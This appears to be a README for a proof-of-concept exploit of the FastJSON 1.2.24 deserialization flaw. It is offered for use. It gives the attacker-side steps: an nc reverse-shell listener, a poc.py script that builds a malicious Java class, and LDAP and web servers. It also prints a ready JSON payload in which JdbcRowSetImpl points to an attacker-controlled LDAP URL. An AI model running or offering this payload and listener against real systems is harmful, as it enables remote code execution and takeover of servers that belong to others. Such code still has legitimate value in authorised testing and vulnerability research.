# FastJSON <= 1.2.24 poc


#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:


* 攻击机

启动监听

```py
nc -lvnp 9001
```
自动开启服务并生成payload

```python3
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] FastJSON <= 1.2.24

[+] Exploit java class created success
[+] Setting up LDAP server

[+] POST: Send me: {" b " :{ "@type" : "com.sun.rowset.JdbcRowSetImpl" , "dataSourceName" : "ldap://localhost:1389/a" , "autoCommit" : true}}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389

```


